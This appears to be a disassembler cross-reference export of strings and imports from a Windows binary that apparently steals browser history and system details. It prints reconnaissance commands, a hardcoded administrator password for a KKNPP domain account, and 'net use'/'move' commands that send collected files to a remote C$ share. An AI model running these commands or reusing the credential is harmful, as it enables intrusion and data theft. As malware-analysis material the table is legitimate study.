reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x401491	0x4ac84c	string	0x401000	CCS_AllocateAndInitializeSid
0x4014a3	0x4a5178	import	0x401000	KERNEL32.dll.GetProcAddress
0x4014ae	0x4ac86c	string	0x401000	CCS_CheckTokenMembership
0x4014c0	0x4a5178	import	0x401000	KERNEL32.dll.GetProcAddress
0x4014cb	0x4ac888	string	0x401000	CCS_FreeSid
0x4014dd	0x4a5178	import	0x401000	KERNEL32.dll.GetProcAddress
0x4014e8	0x4ac894	string	0x401000	CCS_InitializeAcl
0x4014fa	0x4a5178	import	0x401000	KERNEL32.dll.GetProcAddress
0x401505	0x4ac8a8	string	0x401000	CCS_SetSecurityInfo
0x401517	0x4a5178	import	0x401000	KERNEL32.dll.GetProcAddress
0x401522	0x4ac8bc	string	0x401000	CCS_shell32.dll
0x401530	0x4a50b8	import	0x401000	KERNEL32.dll.LoadLibraryA
0x401539	0x4ac8cc	string	0x401000	CCS_ShellExecuteA
0x40154b	0x4a5178	import	0x401000	KERNEL32.dll.GetProcAddress
0x401556	0x4ac8e0	string	0x401000	CCS_shlwapi.dll
0x401564	0x4a50b8	import	0x401000	KERNEL32.dll.LoadLibraryA
0x40156d	0x4ac8f0	string	0x401000	CCS_PathFileExistsA
0x40157f	0x4a5178	import	0x401000	KERNEL32.dll.GetProcAddress
0x40158a	0x4ac904	string	0x401000	CCS_ntdll.dll
0x401598	0x4a50b8	import	0x401000	KERNEL32.dll.LoadLibraryA
0x4015a1	0x4ac914	string	0x401000	CCS_NtCreateThreadEx
0x4015b3	0x4a5178	import	0x401000	KERNEL32.dll.GetProcAddress
0x4015be	0x4ac92c	string	0x401000	CCS_Iphlpapi.dll
0x4015cc	0x4a50b8	import	0x401000	KERNEL32.dll.LoadLibraryA
0x4015d5	0x4ac940	string	0x401000	CCS_GetAdaptersInfo
0x4015e7	0x4a5178	import	0x401000	KERNEL32.dll.GetProcAddress
0x4015f2	0x4ac954	string	0x401000	CCS_GetPerAdapterInfo
0x401604	0x4a5178	import	0x401000	KERNEL32.dll.GetProcAddress
0x40160f	0x4ac96c	string	0x401000	CCS_kernel32.dll
0x40161d	0x4a50b8	import	0x401000	KERNEL32.dll.LoadLibraryA
0x401626	0x4ac980	string	0x401000	CCS_CreateToolhelp32Snapshot
0x401638	0x4a5178	import	0x401000	KERNEL32.dll.GetProcAddress
0x401643	0x4ac9a0	string	0x401000	CCS_CloseToolhelp32SnapshotA
0x401655	0x4a5178	import	0x401000	KERNEL32.dll.GetProcAddress
0x401660	0x4ac9c0	string	0x401000	CCS_Process32First
0x401672	0x4a5178	import	0x401000	KERNEL32.dll.GetProcAddress
0x40167d	0x4ac9d4	string	0x401000	CCS_Process32Next
0x40168f	0x4a5178	import	0x401000	KERNEL32.dll.GetProcAddress
0x40169a	0x4ac9e8	string	0x401000	CCS_Wtsapi32.dll
0x4016a8	0x4a50b8	import	0x401000	KERNEL32.dll.LoadLibraryA
0x4016b1	0x4ac9fc	string	0x401000	CCS_WTSEnumerateProcessesA
0x4016c3	0x4a5178	import	0x401000	KERNEL32.dll.GetProcAddress
0x4016ce	0x4aca18	string	0x401000	CCS_Advapi32.dll
0x4016dc	0x4a50b8	import	0x401000	KERNEL32.dll.LoadLibraryA
0x4016e5	0x4aca2c	string	0x401000	CCS_LookupAccountSidA
0x4016f7	0x4a5178	import	0x401000	KERNEL32.dll.GetProcAddress
0x40173b	0x4a501c	import	0x401710	KERNEL32.dll.GetVersionExA
0x4017b7	0x4ac360	string	0x401770	%s\*.default
0x4017d9	0x4a500c	import	0x401770	KERNEL32.dll.FindFirstFileA
0x401814	0x4ac370	string	0x401770	%s\%s\places.sqlite
0x40183c	0x4a5018	import	0x401770	KERNEL32.dll.FindNextFileA
0x40184a	0x4a5014	import	0x401770	KERNEL32.dll.FindClose
0x4018c9	0x4ac388	string	0x401870	NULL
0x4018de	0x4ac390	string	0x401870	\n%s = %s
0x40194a	0x4ac39c	string	0x401910	Callback function called
0x401960	0x4a5020	import	0x401910	KERNEL32.dll.GetTempPathA
0x401966	0x4ac3b8	string	0x401910	MSI17f1f.tmp
0x401972	0x4a523c	import	0x401910	SHLWAPI.dll.PathAppendA
0x401985	0x4a5010	import	0x401910	KERNEL32.dll.CopyFileA
0x4019ae	0x4a5024	import	0x401910	KERNEL32.dll.DeleteFileA
0x4019c1	0x4ac3c8	string	0x401910	SELECT url FROM moz_places
0x4019d3	0x4ac3e4	string	0x401910	SELECT url FROM urls
0x401a02	0x4ac400	string	0x401910	Path: %s\r\n
0x401a61	0x4a5024	import	0x401910	KERNEL32.dll.DeleteFileA
0x401b1f	0x4ac40c	string	0x401a80	%s\*.*
0x401b41	0x4a500c	import	0x401a80	KERNEL32.dll.FindFirstFileA
0x401baf	0x4bd558	string	0x401a80	All Users
0x401bbd	0x4a5008	import	0x401a80	KERNEL32.dll.lstrcmpA
0x401bf7	0x4ac414	string	0x401a80	%s\%s\AppData\Roaming\Mozilla\Firefox\Profiles
0x401c16	0x4ac444	string	0x401a80	%s\%s\AppData\Local\Google\Chrome\User Data\Default\History
0x401c37	0x4ac480	string	0x401a80	%s\%s\AppData\Application Data\Mozilla\Firefox\Profiles
0x401c56	0x4ac4b8	string	0x401a80	%s\%s\Local Settings\Application Data\Google\Chrome\User Data\Default\History
0x401c8b	0x4a5238	import	0x401a80	SHLWAPI.dll.PathFileExistsA
0x401cad	0x4a5238	import	0x401a80	SHLWAPI.dll.PathFileExistsA
0x401cd7	0x4a5018	import	0x401a80	KERNEL32.dll.FindNextFileA
0x401cec	0x4a5014	import	0x401a80	KERNEL32.dll.FindClose
0x401d53	0x4ac508	string	0x401d10	C:\users
0x401d5f	0x4a5028	import	0x401d10	KERNEL32.dll.lstrcpyA
0x401d67	0x4ac514	string	0x401d10	C:\Documents and Settings
0x401d73	0x4a5028	import	0x401d10	KERNEL32.dll.lstrcpyA
0x401d82	0x4a5028	import	0x401d10	KERNEL32.dll.lstrcpyA
0x401f7d	0x4a5028	import	0x401f10	KERNEL32.dll.lstrcpyA
0x401feb	0x492e45	string	0x401f10	j\fh`
0x402085	0x4ac320	string	0x401f10	%s*.*
0x4020a7	0x4a500c	import	0x401f10	KERNEL32.dll.FindFirstFileA
0x402270	0x492e45	string	0x401f10	j\fh`
0x402291	0x492e45	string	0x401f10	j\fh`
0x402301	0x492e45	string	0x401f10	j\fh`
0x40234a	0x4a5028	import	0x401f10	KERNEL32.dll.lstrcpyA
0x40246b	0x492e45	string	0x401f10	j\fh`
0x40248c	0x492e45	string	0x401f10	j\fh`
0x4024fd	0x492e45	string	0x401f10	j\fh`
0x40252c	0x492e45	string	0x401f10	j\fh`
0x402546	0x492e45	string	0x401f10	j\fh`
0x40255f	0x492e45	string	0x401f10	j\fh`
0x402575	0x4a5018	import	0x401f10	KERNEL32.dll.FindNextFileA
0x40258a	0x4a5014	import	0x401f10	KERNEL32.dll.FindClose
0x4026e9	0x4a5028	import	0x4025a0	KERNEL32.dll.lstrcpyA
0x402706	0x4a5028	import	0x4025a0	KERNEL32.dll.lstrcpyA
0x40270c	0x4ac33c	string	0x4025a0	dkwero38oerA^t@#
0x40274a	0x4a5024	import	0x4025a0	KERNEL32.dll.DeleteFileA
0x402755	0x4a5034	import	0x4025a0	KERNEL32.dll.Sleep
0x4027c5	0x4a5030	import	0x402770	KERNEL32.dll.GetVolumeInformationA
0x4027d5	0x4a502c	import	0x402770	KERNEL32.dll.GetDriveTypeA
0x40281b	0x4ac354	string	0x402770	%s\%c.tmp
0x40291a	0x4ac278	string	0x402860	%02X:%02X:%02X:%02X:%02X:%02X
0x402933	0x4a5028	import	0x402860	KERNEL32.dll.lstrcpyA
0x402a26	0x4a5038	import	0x402960	KERNEL32.dll.GetComputerNameA
0x402aa0	0x4ac298	string	0x402960	CCS_SOFTWARE\Microsoft\Windows NT\CurrentVersion
0x402ab5	0x4a5028	import	0x402960	KERNEL32.dll.lstrcpyA
0x402abb	0x4ac2cc	string	0x402960	CCS_RegisteredOwner
0x402ad0	0x4a5028	import	0x402960	KERNEL32.dll.lstrcpyA
0x402ad6	0x4ac2e0	string	0x402960	CCS_RegisteredOrganization
0x402aeb	0x4a5028	import	0x402960	KERNEL32.dll.lstrcpyA
0x402af1	0x4ac2fc	string	0x402960	CCS_InstallDate
0x402b06	0x4a5028	import	0x402960	KERNEL32.dll.lstrcpyA
0x402d51	0x4ac30c	string	0x402960	%08x
0x402f3d	0x4ac314	string	0x402960	%08X
0x403019	0x4a5028	import	0x402f70	KERNEL32.dll.lstrcpyA
0x40306c	0x4a5028	import	0x403040	KERNEL32.dll.lstrcpyA
0x403101	0x4abf3c	string	0x4030b0	%s\*.*
0x403128	0x4a500c	import	0x4030b0	KERNEL32.dll.FindFirstFileA
0x40315d	0x4abf44	string	0x4030b0	%s\%s
0x403195	0x4a5050	import	0x4030b0	KERNEL32.dll.RemoveDirectoryA
0x4031a4	0x4a5054	import	0x4030b0	KERNEL32.dll.SetFileAttributesA
0x4031b1	0x4a5024	import	0x4030b0	KERNEL32.dll.DeleteFileA
0x4031c5	0x4a5018	import	0x4030b0	KERNEL32.dll.FindNextFileA
0x4031da	0x4a5014	import	0x4030b0	KERNEL32.dll.FindClose
0x4032c6	0x4a5020	import	0x403250	KERNEL32.dll.GetTempPathA
0x4032d7	0x4abf4c	string	0x403250	CCS_%s\temp\%s
0x40330a	0x4ab68c	string	0x403250	CCS_/c %s > "%s"
0x403332	0x4abf5c	string	0x403250	CCS_/c %s
0x403360	0x4abf68	string	0x403250	CCS_ComSpec
0x40336e	0x4a5048	import	0x403250	KERNEL32.dll.GetEnvironmentVariableA
0x4034d4	0x4a5020	import	0x4033b0	KERNEL32.dll.GetTempPathA
0x4034e1	0x4abf74	string	0x4033b0	CCS_%s\temp
0x40350f	0x4abf80	string	0x4033b0	CCS_%s\%s
0x403538	0x4abf8c	string	0x4033b0	CCS_%s\browser.his
0x403563	0x4a504c	import	0x4033b0	KERNEL32.dll.CreateDirectoryA
0x403572	0x4a5054	import	0x4033b0	KERNEL32.dll.SetFileAttributesA
0x403581	0x4a504c	import	0x4033b0	KERNEL32.dll.CreateDirectoryA
0x403590	0x4a5054	import	0x4033b0	KERNEL32.dll.SetFileAttributesA
0x403596	0x4abfa0	string	0x4033b0	res.ip
0x40359b	0x4abfa8	string	0x4033b0	ipconfig /all
0x4035a8	0x4abfb8	string	0x4033b0	task.list
0x4035ad	0x4abfc4	string	0x4033b0	tasklist
0x4035ba	0x4abfd0	string	0x4033b0	netstat.res
0x4035bf	0x4abfdc	string	0x4033b0	netstat -naop tcp
0x4035cc	0x4abff0	string	0x4033b0	netsh.res
0x4035d1	0x4abffc	string	0x4033b0	netsh interface ip show config
0x4035fc	0x4ac01c	string	0x4033b0	\r\n=================== Connection Status ===================\r\n
0x40363a	0x4a5034	import	0x4033b0	KERNEL32.dll.Sleep
0x403645	0x4a5034	import	0x4033b0	KERNEL32.dll.Sleep
0x403657	0x4ac05c	string	0x4033b0	CCS_%s\~%sMT.tmp
0x403683	0x4ac070	string	0x4033b0	CCS_%s-%s
0x4036a5	0x4ac07c	string	0x4033b0	CCS_abcd@123
0x4036fc	0x4ac090	string	0x4033b0	net use \\10.38.1.35\C$ su.controller5kk /user:KKNPP\administrator
0x40370e	0x4a5034	import	0x4033b0	KERNEL32.dll.Sleep
0x40371b	0x4ac0d4	string	0x4033b0	move /y %s \\10.38.1.35\C$\Windows\Temp\MpLogs\
0x40374a	0x4a5034	import	0x4033b0	KERNEL32.dll.Sleep
0x403752	0x4ac104	string	0x4033b0	net use \\10.38.1.35\C$ /delete
0x4037d9	0x4a5028	import	0x403780	KERNEL32.dll.lstrcpyA
0x4037eb	0x4a5054	import	0x403780	KERNEL32.dll.SetFileAttributesA
0x4037f8	0x4ac124	string	0x403780	CCS_/c ping -n 3 127.0.0.1 >NUL & echo EEEE > "%s"
0x403826	0x4ac158	string	0x403780	CCS_ComSpec
0x403834	0x4a5048	import	0x403780	KERNEL32.dll.GetEnvironmentVariableA
0x403895	0x4a5028	import	0x403870	KERNEL32.dll.lstrcpyA
0x4038a0	0x4a5044	import	0x403870	KERNEL32.dll.GetCurrentThread
0x4038a7	0x4a5040	import	0x403870	KERNEL32.dll.WaitForSingleObject
0x4038d6	0x4b70f8	string	0x4038d0	CREATE TABLE x( candidate TEXT, prefix TEXT HIDDEN, wholeline TEXT HIDDEN, phase INT HIDDEN)
0x403b06	0x4b7780	string	0x403a40	PRAGMA database_list
0x403b50	0x4b7798	string	0x403a40	PRAGMA database_list
0x403b92	0x4b7554	string	0x403a40	%z%sSELECT name FROM "%w".sqlite_master WHERE type='table'
0x403bb2	0x4b77b0	string	0x403a40	UNION
0x403c27	0x4b77b8	string	0x403a40	PRAGMA database_list
0x403c6d	0x4b77d0	string	0x403a40	%z%sSELECT pti.name FROM "%w".sqlite_master AS sm JOIN pragma_table_info(sm.name,%Q) AS pti WHERE sm.type='table'
0x403c8d	0x4b7844	string	0x403a40	UNION
0x404020	0x4b7854	string	0x403ea0	%.*s
0x404556	0x40459c	string	0x404430	덋E\bP blocks=Hangul Syllables,Basic Latin
0x404ac0	0x4b0254	string	0x404a30	20b:20e
0x404b43	0x4b025c	string	0x404b30	20c:20e
0x404eb6	0x4b0268	string	0x404e80	40f-21a-21d
0x4051d9	0x49cc00	string	0x405150	WVS3
0x405503	0x49cc00	string	0x405440	WVS3
0x405538	0x4b0278	string	0x405440	local time unavailable
0x405614	0x4b02bc	string	0x4055d0	localtime
0x40567c	0x4b02c8	string	0x4055d0	unixepoch
0x4057d4	0x4b02d8	string	0x4055d0	weekday
0x405894	0x49cc00	string	0x4055d0	WVS3
0x405922	0x4b02e4	string	0x4055d0	start of
0x4059af	0x4b02f0	string	0x4055d0	month
0x4059d7	0x4b02f8	string	0x4055d0	year
0x405b1f	0x49cc00	string	0x4055d0	WVS3
0x4060b8	0x4b0304	string	0x406060	%04d-%02d-%02d %02d:%02d:%02d
0x40614c	0x4b0324	string	0x406100	%02d:%02d:%02d
0x4061d7	0x4b0334	string	0x406190	%04d-%02d-%02d
0x4064e0	0x4b0344	string	0x406220	%02d
0x406541	0x4b034c	string	0x406220	%06.3f
0x406581	0x4b0354	string	0x406220	%02d
0x40660c	0x49cc00	string	0x406220	WVS3
0x40663d	0x49cc00	string	0x406220	WVS3
0x40666b	0x4b035c	string	0x406220	%02d
0x40669f	0x4b0364	string	0x406220	%03d
0x4066db	0x4b036c	string	0x406220	%.16g
0x40671b	0x4b0374	string	0x406220	%02d
0x40674c	0x4b037c	string	0x406220	%02d
0x406788	0x49cc00	string	0x406220	WVS3
0x406797	0x4b0384	string	0x406220	%lld
0x4067dc	0x4b038c	string	0x406220	%02d
0x406820	0x49cc00	string	0x406220	WVS3
0x406856	0x4b0394	string	0x406220	%04d
0x4072dd	0x4b04e8	string	0x4072c0	failed to allocate %u bytes of memory
0x40736e	0x4b0510	string	0x407340	failed memory resize %u to %u bytes
0x4075bd	0x4a50a4	import	0x4075b0	KERNEL32.dll.InterlockedCompareExchange
0x4075ec	0x4a50d4	import	0x4075b0	KERNEL32.dll.InitializeCriticalSection
0x40762d	0x4a50a4	import	0x407620	KERNEL32.dll.InterlockedCompareExchange
0x407666	0x4a513c	import	0x407620	KERNEL32.dll.DeleteCriticalSection
0x4076bc	0x4a50d4	import	0x407680	KERNEL32.dll.InitializeCriticalSection
0x407709	0x4a513c	import	0x4076f0	KERNEL32.dll.DeleteCriticalSection
0x407727	0x4a5120	import	0x407720	KERNEL32.dll.EnterCriticalSection
0x40775b	0x4a5084	import	0x407730	KERNEL32.dll.TryEnterCriticalSection
0x407787	0x4a50ec	import	0x407780	KERNEL32.dll.LeaveCriticalSection
0x408f82	0x4a7f10	string	0x408760	0123456789ABCDEF0123456789abcdef
0x409b24	0x4b0544	string	0x408760	NULL
0x409b30	0x4b054c	string	0x408760	(NULL)
0x40aac4	0x4a5140	import	0x40aa10	KERNEL32.dll.GetCurrentThreadId
0x40ab2c	0x4a5148	import	0x40aaf0	KERNEL32.dll.CloseHandle
0x40c1cc	0x49cc00	string	0x40bdc0	WVS3
0x40c36d	0x4b0558	string	0x40c360	922337203685477580
0x40d207	0x4b056c	string	0x40d200	API call with %s database connection pointer
0x40d22a	0x4b059c	string	0x40d220	NULL
0x40d25d	0x4b05a4	string	0x40d220	unopened
0x40d2a8	0x4b05b0	string	0x40d280	invalid
0x40d453	0x49cc00	string	0x40d420	WVS3
0x40d489	0x49cc00	string	0x40d420	WVS3
0x40d4e8	0x49cc00	string	0x40d420	WVS3
0x40d578	0x49cc00	string	0x40d420	WVS3
0x40e6e9	0x4b1560	string	0x40e610	OsError 0x%lx (%lu)
0x40e7d4	0x4b1578	string	0x40e730	os_win.c:%d: (%lu) %s(%s) - %s
0x40e8c5	0x4b15a0	string	0x40e8a0	delayed %dms for lock/sharing conflict at line %d
0x40ea4e	0x4b15d4	string	0x40e9e0	winSeekFile
0x40eb02	0x4b15e0	string	0x40ea80	winClose
0x40ec98	0x4b15ec	string	0x40eb30	winRead
0x40ee46	0x4b15f4	string	0x40ed00	winWrite1
0x40ee6a	0x4b1600	string	0x40ed00	winWrite2
0x40eedf	0x49cc00	string	0x40eea0	WVS3
0x40ef22	0x4b160c	string	0x40eea0	winTruncate1
0x40ef78	0x4b161c	string	0x40eea0	winTruncate2
0x40f022	0x4b162c	string	0x40efe0	winSync1
0x40f071	0x4b1638	string	0x40efe0	winSync2
0x40f0ff	0x4b1644	string	0x40f090	winFileSize
0x40f275	0x4b1650	string	0x40f1e0	winUnlockReadLock
0x40f606	0x4b1664	string	0x40f5a0	winUnlock
0x40fcd5	0x4b1674	string	0x40fc50	%s-shm
0x40fe0d	0x4b167c	string	0x40fc50	winOpenShm
0x4102eb	0x4b1688	string	0x410240	winShmMap1
0x41035d	0x4b1694	string	0x410240	winShmMap2
0x410450	0x4b16a0	string	0x410240	winShmMap3
0x410555	0x4b16ac	string	0x410520	winUnmapfile1
0x4105d1	0x4b16bc	string	0x410520	winUnmapfile2
0x410761	0x4b16cc	string	0x410600	winMapfile1
0x4107d5	0x4b16d8	string	0x410600	winMapfile2
0x4109f6	0x4b173c	string	0x4109f0	etilqs_
0x410ab3	0x4b1744	string	0x4109f0	winGetTempname1
0x410b61	0x4b1758	string	0x4109f0	winGetTempname2
0x410c40	0x4b176c	string	0x4109f0	winGetTempname3
0x410ce1	0x4b1780	string	0x4109f0	winGetTempname4
0x410d28	0x4b1790	string	0x4109f0	winGetTempname5
0x410d3e	0x4b17a0	string	0x4109f0	etilqs_
0x41116e	0x4b17a8	string	0x410ea0	winOpen
0x411220	0x4b17b0	string	0x410ea0	psow
0x41142e	0x4b17b8	string	0x4112b0	winDelete
0x411567	0x4b17c4	string	0x411470	winAccess
0x4116ef	0x4b17d0	string	0x411680	%s%c%s
0x41176e	0x4b17d8	string	0x411680	winFullPathname1
0x411803	0x4b17ec	string	0x411680	winFullPathname2
0x41187b	0x4b1800	string	0x411680	winFullPathname3
0x41190e	0x4b1814	string	0x411680	winFullPathname4
0x411c2b	0x49cc00	string	0x411bf0	WVS3
0x412711	0x49cc00	string	0x4126d0	WVS3
0x413108	0x49cc00	string	0x4130d0	WVS3
0x4131e2	0x49cc00	string	0x413180	WVS3
0x414f97	0x49cc00	string	0x414f50	WVS3
0x416903	0x49cc00	string	0x4167b0	WVS3
0x41696f	0x49cc00	string	0x4167b0	WVS3
0x416b54	0x4b1974	string	0x4167b0	recovered %d pages from %s
0x417074	0x49cc00	string	0x416ff0	WVS3
0x417383	0x49cc00	string	0x417170	WVS3
0x4178a2	0x49cc00	string	0x417770	WVS3
0x418976	0x4b19fc	string	0x4184e0	nolock
0x418999	0x4b1a04	string	0x4184e0	immutable
0x418fe5	0x418fec	string	0x418dc0	3\tEԉE؉E܉E blocks=Basic Latin,Cyrillic Supplement,Arabic,Syriac
0x41bdfc	0x4b1a10	string	0x41ba20	recovered %d frames from WAL file %s
0x41cb45	0x4b1a38	string	0x41cae0	cannot limit WAL size: %s
0x41d02e	0x41d046	string	0x41cef0	3ҋE\bf blocks=Basic Latin,Cyrillic
0x41df81	0x49cc00	string	0x41db60	WVS3
0x420dd1	0x4b1a54	string	0x420d70	:memory:
0x421e23	0x4a83d8	string	0x421d60	SQLite format 3
0x42215b	0x4a83d8	string	0x422110	SQLite format 3
0x4240b1	0x424199	string	0x424040	3\vM\bf
0x424185	0x424199	string	0x424040	3\vM\bf
0x424852	0x424a11	string	0x424450	3ɋU\bf blocks=Basic Latin,Latin Extended-B
0x424878	0x424a11	string	0x424450	3ɋU\bf blocks=Basic Latin,Latin Extended-B
0x4248c5	0x424a11	string	0x424450	3ɋU\bf blocks=Basic Latin,Latin Extended-B
0x424943	0x424a11	string	0x424450	3ɋU\bf blocks=Basic Latin,Latin Extended-B
0x424987	0x424a11	string	0x424450	3ɋU\bf blocks=Basic Latin,Latin Extended-B
0x424a0a	0x424a11	string	0x424450	3ɋU\bf blocks=Basic Latin,Latin Extended-B
0x429d8f	0x4b1a68	string	0x429d70	invalid page number %d
0x429dbf	0x4b1a80	string	0x429d70	2nd reference to page %d
0x429e36	0x4b1a9c	string	0x429df0	Failed to read ptrmap key=%d
0x429e73	0x4b1abc	string	0x429df0	Bad ptr map entry key=%d expected=(%d,%d) got=(%d,%d)
0x429ed8	0x4b1af4	string	0x429e90	%d of %d pages missing from overflow list starting at %d
0x429f28	0x4b1b30	string	0x429e90	failed to get page %d
0x429fa7	0x4b1b48	string	0x429e90	freelist leaf count too big on page %d
0x42a098	0x4b1b70	string	0x429e90	free-page count in header is too small
0x42a2ae	0x4b1b98	string	0x42a220	Page %d:
0x42a2e1	0x4b1ba4	string	0x42a220	unable to get the page. error code=%d
0x42a31e	0x4b1bcc	string	0x42a220	btreeInitPage() returns error code %d
0x42a34a	0x4b1bf4	string	0x42a220	On tree page %d cell %d:
